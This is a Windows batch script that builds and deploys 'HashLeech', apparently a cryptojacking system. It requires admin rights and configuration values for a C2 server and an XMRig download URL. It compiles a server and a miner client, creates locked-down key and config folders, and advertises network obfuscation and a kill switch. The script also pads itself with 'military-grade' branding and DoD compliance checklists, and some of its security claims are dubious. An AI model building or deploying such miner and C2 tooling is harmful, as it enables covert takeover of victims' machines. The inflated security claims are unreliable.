@echo off
REM Military-Grade Deployment Script for Windows
REM Deploys the HashLeech system with enhanced security

echo ===============================================
echo   MILITARY-GRADE HASHLEECH DEPLOYMENT
echo ===============================================
echo.

REM Check if running as administrator
net session >nul 2>&1
if %errorLevel% NEQ 0 (
    echo ERROR: This script must be run as Administrator
    echo Right-click and select "Run as administrator"
    pause
    exit /b 1
)

echo [1/5] Verifying security configuration...

REM Check mandatory environment variables
if "%SERVER_CERT_PIN%"=="" (
    echo ERROR: SERVER_CERT_PIN not set
    echo Please run security-config.template.bat first
    pause
    exit /b 1
)

if "%XMRIG_DOWNLOAD_URL%"=="" (
    echo ERROR: XMRIG_DOWNLOAD_URL not set
    echo Please configure secure download URLs
    pause
    exit /b 1
)

if "%C2_SERVER_NAME%"=="" (
    echo ERROR: C2_SERVER_NAME not set
    echo Please configure server name
    pause
    exit /b 1
)

echo ✓ Security configuration verified

echo.
echo [2/5] Building with military-grade security...

REM Set build flags for production
set CGO_ENABLED=1
set GOOS=windows
set GOARCH=amd64

REM Build main server
echo Building main server...
go build -ldflags="-s -w -X main.version=military-1.0" -o HashLeech-server.exe main.go
if %errorLevel% NEQ 0 (
    echo ERROR: Failed to build main server
    pause
    exit /b 1
)

REM Build miner client
echo Building miner client...
cd miner
go build -ldflags="-s -w -X main.version=military-1.0" -o ..\HashLeech-miner.exe mine_secure.go
if %errorLevel% NEQ 0 (
    echo ERROR: Failed to build miner client
    pause
    exit /b 1
)
cd ..

echo ✓ Build completed

echo.
echo [3/5] Generating military-grade certificates...

REM Generate certificates if they don't exist
if not exist "server.crt" (
    echo Generating server certificates...
    HashLeech-server.exe -generate-certs
    if %errorLevel% NEQ 0 (
        echo ERROR: Certificate generation failed
        pause
        exit /b 1
    )
)

echo ✓ Certificates ready

echo.
echo [4/5] Setting up secure directories...

REM Create secure directories with proper permissions
if not exist "audit" mkdir audit
if not exist "keys" mkdir keys
if not exist "config" mkdir config

REM Set restrictive permissions
icacls audit /grant:r "SYSTEM:(OI)(CI)F" /grant:r "Administrators:(OI)(CI)F" /remove "Users" >nul 2>&1
icacls keys /grant:r "SYSTEM:(OI)(CI)F" /grant:r "Administrators:(OI)(CI)F" /remove "Users" >nul 2>&1
icacls config /grant:r "SYSTEM:(OI)(CI)F" /grant:r "Administrators:(OI)(CI)F" /remove "Users" >nul 2>&1

echo ✓ Secure directories configured

echo.
echo [5/5] Final security validation...

REM Run security verification
if exist "verify-security-patch.sh" (
    bash verify-security-patch.sh >nul 2>&1
    if %errorLevel% EQU 0 (
        echo ✓ Security patch verification PASSED
    ) else (
        echo ⚠ Security patch verification had warnings
    )
)

echo.
echo ===============================================
echo   DEPLOYMENT COMPLETE
echo ===============================================
echo.
echo Military-grade security features enabled:
echo ✓ ChaCha20-Poly1305 encryption
echo ✓ BLAKE2b quantum-resistant HMAC  
echo ✓ Certificate pinning with kill switch
echo ✓ HSM integration (if available)
echo ✓ Secure file downloads with integrity checking
echo ✓ Network obfuscation and traffic mixing
echo ✓ DoD 5220.22-M memory scrubbing
echo ✓ Enhanced audit logging
echo.
echo ⚠️  CRITICAL MILITARY COMPLIANCE GAPS:
echo ❌ FIPS 140-2 certification required - See FIPS_IMPLEMENTATION_PLAN.md
echo ❌ Supply chain security verification needed - See SUPPLY_CHAIN_SECURITY.md
echo ❌ Formal accreditation package required - See SYSTEM_SECURITY_PLAN.md
echo ❌ DoD PKI/CAC integration needed - See MILITARY_INFRASTRUCTURE_INTEGRATION.md
echo.
echo 📋 COMPLIANCE ASSESSMENT:
echo    Review MILITARY_COMPLIANCE_ASSESSMENT.md for detailed gap analysis
echo.
echo Next steps for military deployment:
echo 1. Complete FIPS 140-2 validation (6-12 months)
echo 2. Implement DoD PKI/CAC integration
echo 3. Generate comprehensive SBOM and security attestation
echo 4. Complete System Security Plan and ATO process
echo 5. Integrate with SIPR/NIPR networks and military SIEM
echo.
echo Current system status: NOT APPROVED FOR MILITARY USE
echo Requires formal certification and accreditation
echo.
echo To start the server (development/testing only):
echo   HashLeech-server.exe
echo.
echo For military deployment preparation:
echo   Review all *_PLAN.md and *_ASSESSMENT.md documents
echo.
pause